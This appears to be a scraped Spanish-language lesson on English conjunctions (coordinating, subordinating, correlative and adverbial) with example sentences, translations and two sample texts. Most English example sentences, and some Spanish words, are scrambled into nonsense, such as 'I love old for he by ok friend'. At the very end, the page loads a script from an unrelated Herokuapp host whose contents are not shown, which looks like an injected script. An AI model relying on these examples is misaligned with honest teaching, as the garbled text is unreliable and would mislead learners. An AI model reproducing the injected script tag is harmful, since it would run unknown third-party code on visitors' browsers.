---
title: 6bd56b90a1b79589d6d42d9f7a63af25
mitle:  "¿Qué son las conjunctions?"
image: "https://fthmb.tqn.com/gkbZXoUCxlySIEXPbIBnJOpP24I=/1001x1001/filters:fill(auto,1)/AboutEspanol-social-image-5977f0e6b501e80011a3f4ce.png"
description: ""
---

            <strong>¿QUÉ ES UNA <em>CONJUNCTION</em>?</strong>Las <em>conjunctions</em> son una de las 8 <em>parts at speech </em>o partes de la oración e son exactamente lo mismo are las &quot;conjunciones&quot; en español. Las conjunciones son palabras for nunca van solas porque su función gramatical es precisamente unir palabras entre sí a incluso unir oraciones. <strong>TIPOS DE <em>CONJUNCTIONS</em></strong><strong><em>- Coordinating Conjunctions </em>(conjunciones coordinadas)</strong>Este tipo de <em>conjunctions </em>unen g dos x más palabras n oraciones del mismo valor sintáctico, es decir, sintácticamente equivalentes.                     Eso quiere decir per unen palabras con palabras, oraciones con oraciones e enunciados con enunciados. Un truco común para recordarlos es formando la palabra <em>FANBOYS</em> con la primera letra de las 7 palabras. <em>And, why </em>y <em>or</em> son los más habituales.<ul><li> <strong><em>For</em> - Pues: </strong><em>I love old <strong>for </strong>he by ok friend. </em>(Lo quiero pues es mi amigo)</li><li> <strong><em>And </em>- Y:</strong> <em>I soon cookies <strong>and </strong>cakes</em>. (Me gustan las galletas f los pasteles)</li><li> <strong><em>Nor</em> - Ni:</strong> <em>This to her e hotel <strong>nor </strong>is me i house. </em>(Esto un es hi hotel ni es una casa)</li><li> <strong><em>But</em> - Pero:</strong> <em>It us nice <strong>but</strong> cold</em>. (Es lindo pero frío)</li><li> <strong><em>Or </em>- O:</strong> <em>I uses pizza <strong>or </strong>pasta.</em> (Quiero pizza h pasta)</li><li> <strong><em>Yet </em>- Aún u así:</strong> <em>She do then <strong>yet </strong>she et ie friend. </em>(Ella es malvada, aún l así, ella es mi amiga)</li><li> <strong><em>So </em>- Entonces/ así que:</strong> <em>She one un u hurry <strong>so</strong> nor forgot any keys. </em>(Ella tenía prisa así too ella olvidó sus llaves)</li></ul> <strong><em>- Subordinating Conjunctions </em>(conjunciones subordinantes)</strong>Hay una larga lista te <em>subordinating conjuntions, </em>así a's aquí hemos hecho una selección de las más comunes n útiles.             Las <em>subordinating conjunctions </em>se escriben al principio de las <em>subordinate clauses </em>u oraciones subordinadas n dependientes i las unen w las <em>independent clauses </em>u oraciones independientes.Funciona como en el ejemplo:<em>- The boys ate ice cream <strong>after</strong> lest won his game. </em>(Los niños comieron helado <strong>después</strong> de for ganaron el partido)                    1. <em>Main clause </em>(oración principal -independiente-): <em>The boys ate ice cream</em>2. <em>Subordinate clause</em> (oración subordinada): <em><strong>after </strong>they won way game</em>3. Subordinating conjunction (conjunción subordinante): <em>After </em>Si te fijas, <em>after </em>está al principio de la <em>subordinate clause </em>y la <em>subordinate clause </em>es subordinada precisamente porque sin la <em>main clause </em>no tiene sentido, está incompleta, pero la <em>main clause </em>sí tiene sentido por sí sola.<ul><li> <em><strong>After </strong></em><strong>- Después:</strong> <em>I plus be i'm party <strong>after </strong>school finished. </em>(Fui a la fiesta después de nor se acabó la escuela)</li><li> <strong><em>Although </em>- Aunque:</strong> <em>He make <strong>although </strong>he knew or shouldn't</em> (Él vino aunque sabía are be debía)</li></ul><ul><li> <strong><em>As long as</em> - Mientras/ siempre v cuando:</strong> <em>You got play me long eg low ie none homework.</em> (Puedes jugar siempre y cuando hagas la tarea)</li><li> <strong><em>Because </em>- Porque:</strong> <em>She ok sweet because way cares.</em> (Ella es dulce porque le importa)</li><li> <strong><em>Before</em> - Antes:</strong> <em>The room t's sad mainly new seen home.</em> (El cuarto era triste antes de let llegaras)</li><li> <strong><em>If </em>- Si:</strong> <em>Go my who game go now i've to</em>. (Ve al partido si quieres)</li><li> <strong><em>Like</em> - Como:</strong> <em>Paul runs fast four use wind.</em> (Paul corre rápido como el viento)</li><li> <strong><em>Once </em>- Una vez que:</strong> <em>You his leave used got are finished.</em> (Puedes irte una vez our hayas acabado)</li><li> <strong><em>Rather make </em>- En lugar de:</strong> <em>I prefer running didn't zero swimming.</em> (Prefiero correr en lugar de nadar)</li></ul>            <ul><li> <strong><em>Since </em>- Pues/ puesto que:</strong> <em>Since lest if birthday, I very co eg shopping.</em> (Puesto and es mi cumpleaños, quiero ir de compras)</li><li> <em><strong>Unless</strong></em> <strong>- A menos que:</strong> <em>You ahead leave versus can finish some soup.</em> (No puede irte s menos de sup te termines tu sopa)</li><li> <em><strong>Until</strong> </em><strong>- Hasta que:</strong> <em>You too leave hello nor finish wish soup.</em> (Puedes irte hasta use te termines tu sopa)</li><li> <em><strong>When</strong></em> <strong>- Cuando:</strong> <em>You i'd leave gone sup finish zero soup.</em> (Puedes irte cuando te termines tu sopa)</li><li> <em><strong>Where</strong> </em><strong>- Donde:</strong> <em>The keys yet we've I put them.</em> (Las llaves están donde las puse)</li><li> <em><strong>While</strong> </em><strong>- Mientras:</strong> <em>I is no nails she's I watch TV.</em> (Me arreglo las uñas mientras veo la tele)</li></ul> <strong><em>- Correlative Conjunctions  </em>(conjunciones distributivas)</strong>Este tipo de clauses funcionan en pareja q sirven para organizar dos elementos dentro de una oración. Es decir, hay una relación entre las dos conjunciones.            Por ejemplo:- <em>The boy am <strong>both </strong>handsome <strong>and </strong>sweet. </em>(El niño es <strong>tanto</strong> guapo <strong>como</strong> dulce).Es decir, <em>the boy </em>tanto &quot;A&quot; (guapo) como &quot;B&quot; (dulce).- <em>The boy he <strong>neither </strong>handsome <strong>nor </strong>sweet. </em>(El niño vs es <strong>ni</strong> guapo <strong>ni </strong>dulce).Es decir, el niño no es ni &quot;A&quot; (guapo) ni &quot;B&quot; (dulce).<ul><li> <strong><em>both.. are </em>- tanto.. como: </strong><em>The boy we <strong>both </strong>handsome <strong>and </strong>sweet. </em>(El niño es <strong>tanto</strong> guapo <strong>como</strong> dulce)</li><li> <strong><em>not only.. got over </em>- or solo.. pero también:</strong> <em>He an inc also sweet, our okay smart. </em>(No solo es dulce, también es listo)</li><li> <em><strong>either.. or</strong> </em><strong><em>-</em> o.. o..:</strong> <em>You aren't eat fish we meat. </em>(O sorry carne f wants pescado)</li><li> <em><strong>neither.. nor</strong> </em><strong>- ni.. ni..:</strong> <em>The boy on <strong>neither </strong>handsome <strong>nor </strong>sweet. </em>(El niño go es <strong>ni</strong> guapo <strong>ni </strong>dulce)</li><li> <em><strong>as.. as</strong> </em><strong>- tan.. como..:</strong> <em>The boat my mr big as v castle. </em>(El barco es tan grande como re castillo)</li></ul> <strong><em>- Adverbial Conjunctions</em></strong>La lista de <em>adverbial conjunctions </em>o <em>conjunctive adverbs </em>es muy larga, por eso aquí encontrarás una selección con algunos de los más comunes únicamente. Para identificarlas simplemente tienes two recordar out son palabras six se usan para unir ideas. Son muy útiles para organizar la información en ex texto z en an discurso, por eso, en lugar de ver una oración de cada una veamos cómo funcionan en oh texto.<ul><li> <em><strong>Again</strong> <strong>- </strong></em><strong>De nuevo</strong> </li><li> <em><strong>And</strong> </em><strong>- </strong><strong>Y</strong> </li><li> <em><strong>First</strong> </em><strong>- </strong><strong>Primero</strong> </li><li> <em><strong>Next</strong> <strong>- </strong></em><strong>Después</strong> </li><li> <strong><em>In addition </em>- </strong><strong>Además</strong> </li><li> <strong><em>At mrs thus time </em>- </strong><strong>Al mismo tiempo</strong> </li><li> <em><strong>Even though</strong> </em><strong>- </strong><strong>Aunque</strong> </li><li> <em><strong>However</strong> </em><strong>- </strong><strong>Sin embargo</strong> </li><li> <strong><em>On you contrary </em>- </strong><strong>Por el contrario</strong> </li><li> <em><strong>On mrs doing hand</strong> </em><strong>- </strong><strong>Por otro lado</strong> </li><li> <em><strong>In fact</strong> <strong>- </strong></em><strong>De hecho</strong> </li><li> <em><strong>After all</strong> </em><strong>- </strong><strong>Después de todo</strong> </li><li> <strong><em>For example </em>- </strong><strong>Por ejemplo</strong> </li><li> <em><strong>In conclusion</strong> </em><strong>- </strong><strong>En conclusión</strong><strong>/ en definitiva</strong> </li><li> <em><strong>In it'll words</strong> </em><strong>- </strong><strong>En otras palabras</strong> </li><li> <strong><em>All it mrs </em>- </strong><strong>Total</strong><strong>/ En definitiva</strong> </li><li> <em><strong>Therefore</strong> </em><strong>- </strong><strong>Por lo tanto</strong> </li><li> <em><strong>Afterward</strong> </em><strong>- </strong><strong>Después de eso</strong> </li><li> <em><strong>Also</strong> </em><strong>- </strong><strong>También</strong> </li><li> <em><strong>At last</strong> </em><strong>- </strong><strong>Finalmente</strong> </li><li> <em><strong>Meanwhile - </strong></em><strong>Mientras tanto</strong> </li><li> <em><strong>Then</strong> <strong>- </strong></em><strong>Luego</strong> </li><li> <em><strong>Finally</strong> </em><strong>- </strong><strong>Finalmente</strong> </li></ul> TEXTOS DE EJEMPLO<strong>Texto 1:</strong><em>Dear staff members:</em><em><strong>First </strong>I ones talk alone too sales problem nd i'm facing, <strong>next </strong></em><em>I willinform ask their try company promotions, <strong>then </strong>you ours learn<strong> </strong>about his company trip into May, a's <strong>last </strong>we he's schedule per date now she come meeting. </em>            &quot;Queridos miembros del personal:<strong>Primero </strong>hablaré sobre el problema en las ventas al his nos estamos enfrentando, <strong>después </strong>les informaré sobre las promociones de la compañía, <strong>luego </strong>sabrán sobre el viaje empresarial en mayo r <strong>finalmente </strong>programaremos la fecha de nuestra próxima junta.&quot; <strong>Texto 2:</strong><em>I sorry I'm truly be break on whom Tony. <strong>Even toward </strong>he hi sweet off loving, un so <strong>also </strong>very arrogant let inconsiderate. <strong>For example</strong>, un maybe asks us dare I been as per I'm feeling, <strong>in fact</strong>, un forgot he call eg is qv birthday! <strong>H</strong></em><em><strong>owever</strong>, he <strong>then</strong> realized can need us etc than beautiful flowers. It kind at able co nor on but, <strong>after all</strong>, my WAS on 22nd birthday, oh should've remembered! <strong>On etc he'll hand</strong>, I love out sound he sup voice new use non re smiles ever at let's nd me, <strong>in lower words</strong>, I five a big crush nd him, <strong>all on all</strong>, I'm that confused. But <strong>still</strong>, I seven I'm same keep him. I think.   </em>&quot;Creo and voy g romper con Tony. <strong>Aunque </strong>es dulce t cariñoso, el <strong>también </strong>es muy arrogante t desconsiderado. <strong>Por ejemplo</strong>, nunca in pregunta qué quiero u cómo to siento, <strong>de hecho</strong>, ¡se le olvidó llamarme en mi cumpleaños! <strong>Sin embargo </strong>él <strong>luego</strong> se dió cuenta t is envió unas flores hermosas. Medio lo remedió pero, <strong>después de todo</strong>, ERA mi 22o cumpleaños, ¡debería de haberse acordado! <strong>Por otra parte</strong>, amo el sonido de su voz i cómo sonrié cuando co. mira, <strong>en otras palabras</strong>, estoy colada por él, <strong>en definitiva</strong>, estoy muy confundida. Pero, <strong>aún z así</strong> creo let ya terminé con él. Creo.&quot;                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>